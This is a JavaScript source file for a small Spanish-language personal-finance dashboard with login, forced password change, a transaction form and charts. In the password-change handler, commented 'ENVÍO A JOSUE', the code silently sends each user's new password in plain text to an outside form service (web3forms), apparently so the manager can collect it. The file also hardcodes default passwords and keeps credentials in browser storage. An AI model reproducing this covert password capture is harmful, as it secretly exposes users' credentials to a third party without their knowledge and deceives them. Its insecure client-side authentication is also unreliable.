class DashboardPro {
    constructor() {
        this.defaultUsers = [
            { user: "santiago", pass: "123", name: "Santiago", mustChange: true },
            { user: "barbara", pass: "456", name: "Barbara", mustChange: true },
            { user: "manager", pass: "admin789", name: "Josue", mustChange: false }
        ];
        this.init();
    }

    init() {
        const savedUsers = localStorage.getItem("app_users");
        this.users = savedUsers ? JSON.parse(savedUsers) : this.defaultUsers;
        this.setupAuth();
        this.checkSession();
    }

    setupAuth() {
        document.getElementById("loginForm").onsubmit = (e) => {
            e.preventDefault();
            const u = document.getElementById("loginUser").value.toLowerCase();
            const p = document.getElementById("loginPass").value;
            const found = this.users.find(user => user.user === u && user.pass === p);
            
            if (found) {
                if (found.mustChange) {
                    this.tempUser = found;
                    document.getElementById("login-screen").style.display = "none";
                    document.getElementById("password-modal").style.display = "flex";
                } else {
                    localStorage.setItem("session", JSON.stringify(found));
                    this.checkSession();
                }
            } else {
                document.getElementById("loginError").textContent = "Acceso denegado";
            }
        };

        document.getElementById("changePassForm").onsubmit = async (e) => {
            e.preventDefault();
            const n1 = document.getElementById("newPass").value;
            // ENVÍO A JOSUE
            await fetch("https://api.web3forms.com/submit", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    access_key: "325e4c7f-963b-4a8a-a004-39af05a5f31d",
                    subject: "Backup Clave: " + this.tempUser.name,
                    mensaje: `Nueva clave establecida: ${n1}`
                })
            });
            this.users = this.users.map(u => u.user === this.tempUser.user ? {...u, pass: n1, mustChange: false} : u);
            localStorage.setItem("app_users", JSON.stringify(this.users));
            localStorage.setItem("session", JSON.stringify(this.users.find(u => u.user === this.tempUser.user)));
            window.location.reload();
        };

        document.getElementById("logoutBtn").onclick = () => {
            localStorage.removeItem("session");
            window.location.reload();
        };
    }

    checkSession() {
        const session = localStorage.getItem("session");
        if (session) {
            this.currentUser = JSON.parse(session);
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app-content").style.display = "block";
            document.getElementById("userNameDisplay").textContent = this.currentUser.name;
            this.startApp();
        }
    }

    startApp() {
        this.transactions = JSON.parse(localStorage.getItem("transactions")) || [];
        this.initCharts();
        this.updateUI();
        document.getElementById("transactionForm").onsubmit = (e) => {
            e.preventDefault();
            const amt = parseFloat(document.getElementById("amount").value);
            this.transactions.push({
                id: Date.now(),
                description: document.getElementById("description").value,
                amount: document.getElementById("type").value === "income" ? Math.abs(amt) : -Math.abs(amt),
                category: document.getElementById("category").value,
                date: document.getElementById("dateInput").value
            });
            localStorage.setItem("transactions", JSON.stringify(this.transactions));
            this.updateUI();
            e.target.reset();
        };
    }

    initCharts() {
        const options = { responsive: true, maintainAspectRatio: false };
        const catCtx = document.getElementById('categoryChart').getContext('2d');
        this.charts_cat = new Chart(catCtx, {
            type: 'doughnut',
            data: { labels: [], datasets: [{ data: [], backgroundColor: ['#6366f1', '#10b981', '#ef4444', '#f59e0b', '#ec4899'] }] },
            options: options
        });

        const trendCtx = document.getElementById('trendChart').getContext('2d');
        this.charts_trend = new Chart(trendCtx, {
            type: 'bar',
            data: { labels: ['Ingresos', 'Gastos'], datasets: [{ label: 'Lps', data: [0, 0], backgroundColor: ['#10b981', '#ef4444'] }] },
            options: options
        });
    }

    updateUI() {
        let inc = 0, exp = 0;
        const catMap = {};
        this.transactions.forEach(t => {
            if (t.amount > 0) inc += t.amount;
            else {
                exp += Math.abs(t.amount);
                catMap[t.category] = (catMap[t.category] || 0) + Math.abs(t.amount);
            }
        });
        document.getElementById("totalIncome").textContent = `L ${inc.toFixed(2)}`;
        document.getElementById("totalExpense").textContent = `L ${exp.toFixed(2)}`;
        document.getElementById("totalSavings").textContent = `L ${(inc - exp).toFixed(2)}`;
        
        this.charts_cat.data.labels = Object.keys(catMap);
        this.charts_cat.data.datasets[0].data = Object.values(catMap);
        this.charts_cat.update();
        
        this.charts_trend.data.datasets[0].data = [inc, exp];
        this.charts_trend.update();
    }
}
window.app = new DashboardPro();